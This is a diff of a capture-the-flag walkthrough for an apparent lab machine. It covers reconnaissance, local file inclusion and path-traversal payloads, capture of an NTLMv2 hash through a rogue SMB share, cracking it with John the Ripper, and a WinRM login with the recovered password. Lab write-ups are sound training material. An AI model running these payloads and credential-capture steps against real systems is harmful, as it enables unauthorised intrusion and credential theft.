@@ -18,81 +18,103 @@ tags:
 ---
 
 ![](/img2/Pasted%20image%2020250311104959.png)
+
 ## Introduction
 
 > In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.208.162
 ```
 
-2. Nmap
+- Nmap
+
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.208.162
 ```
+
 ![](/img2/Pasted%20image%2020250311105508.png)
 
-3. Add domain to /etc/hosts
+- Add domain to /etc/hosts
+
 ```bash
 echo "10.129.208.162 unika.htb" >> /etc/hosts
 ```
 
-4. See the machine technologies 
+- See the machine technologies 
+
 ```bash
 whatweb unika.htb
 ```
+
 ![](/img2/Pasted%20image%2020250311105948.png)
 
-5. Check source code of index page
+- Check source code of index page
+
 ![](/img2/Pasted%20image%2020250311112945.png)
+
 > We found a possible LFI
 
-6. (BONUS) Try to view the backend code of index.php
+- (BONUS) Try to view the backend code of index.php
 
 - Send response to index.php
+
 ```bash
 curl http://unika.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php > index.php
 ```
 
 - Decode index.php 
+
 ```bash
 cat index.php | base64 -d
 ```
+
 ![](/img2/Pasted%20image%2020250311113625.png)
+
 > If "page" is not in the url show the english.html, else allow the user to choose the file to show.
 
 ## Exploitation
 
-1. Test LFI
+- Test LFI
+
 ```bash
 curl http://unika.htb/index.php?page=../../../../windows/win.ini
 ```
+
 ![](/img2/Pasted%20image%2020250311114816.png)
 
-2. Get NTLM Hash with wireshark
+- Get NTLM Hash with wireshark
 
 - Create SMB service in the host and upload test file
+
 ```bash
 apt install samba
 ```
+
 ```bash
 mkdir /usr/share/samba/publico
 ```
+
 ```bash
 echo "TEST" > /usr/share/samba/publico/test.txt
 ```
+
 ![](/img2/Pasted%20image%2020250311141417.png)
+
 ```bash
 systemctl restart smbd
 ```
 
 - Intercept the request to own SMB service with wireshark
+
 ![](/img2/Pasted%20image%2020250311141559.png)
 
 - Copy values to create the HASH
+
 ```
 User:
 Domain:
@@ -101,8 +123,10 @@ HMAC-MD5:
 NTLMv2Response without HMAC: 
 ```
 
-1. User and domain:
+- User and domain:
+
 ![](/img2/Pasted%20image%2020250311141928.png)
+
 ```
 User: Administrator
 Domain: RESPONDER
@@ -111,8 +135,10 @@ HMAC-MD5:
 NTLMv2Response without HMAC: 
 ```
 
-2. Challenge:
+- Challenge:
+
 ![](/img2/Pasted%20image%2020250311142116.png)
+
 ```
 User: Administrator
 Domain: RESPONDER
@@ -121,8 +147,10 @@ HMAC-MD5:
 NTLMv2Response without HMAC: 
 ```
 
-3. HMAC-MD5:
+- HMAC-MD5:
+
 ![](/img2/Pasted%20image%2020250311142320.png)
+
 ```
 User: Administrator
 Domain: RESPONDER
@@ -131,8 +159,10 @@ HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
 NTLMv2Response without HMAC-MD5: 
 ```
 
-4. NTLMv2Response without HMAC-MD5: 
+- NTLMv2Response without HMAC-MD5: 
+
 ![](/img2/Pasted%20image%2020250311142457.png)
+
 ```
 User: Administrator
 Domain: RESPONDER
@@ -142,23 +172,29 @@ NTLMv2Response without HMAC-MD5: 01010000000000006ae580018292db0181e8493b0080daf
 ```
 
 - Create HASH
+
 ```
 User::Domain:Challenge:HMAC-MD5:NTLMv2Response without HMAC-MD5
 ```
+
 ```bash
 echo "Administrator::RESPONDER:583a9235488cccb1:fdaa6c84ae9d9f9c07fe6209c9bcacfc:01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000" > hash.txt
 ```
 
 - Craking the HASH with John The Ripper
+
 ```bash
 john -w=wordlists.txt hash.txt
 ```
+
 ![](/img2/Pasted%20image%2020250311143658.png)
 
-3. Connect to WinRM
+- Connect to WinRM
+
 ```bash
 evil-winrm -i 10.129.208.162 -u administrator -p badminton
 ```
+
 ![](/img2/Pasted%20image%2020250311144043.png)
 
 ## Tasks
